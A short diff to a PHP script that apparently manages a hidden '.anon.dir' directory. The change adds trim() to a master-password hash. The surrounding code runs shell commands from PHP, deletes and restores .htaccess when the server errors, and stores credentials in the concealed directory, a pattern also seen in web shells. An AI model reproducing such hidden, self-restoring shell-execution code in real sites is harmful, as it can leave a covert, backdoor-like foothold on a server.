@@ -163,7 +163,7 @@
     if(strpos($rs,'500 Internal Server Error')||strpos($rs,'503 Service Unavailable')||strpos($rs,'<title>Index of /</title>'))
     {$rs=bash("rm -f ./.htaccess && cp ./.anon.dir/Anon/base/access.cfg ./.htaccess"); sleep(1);};
 
-    $mp=password_hash(file_get_contents("$bp/.anon.dir/Proc/info/pass.inf"),PASSWORD_DEFAULT);
+    $mp=password_hash(trim(file_get_contents("$bp/.anon.dir/Proc/info/pass.inf")),PASSWORD_DEFAULT);
     file_put_contents("$bp/.anon.dir/User/data/master/pass",$mp);
     $gone=(new DeleteOnExit());
 
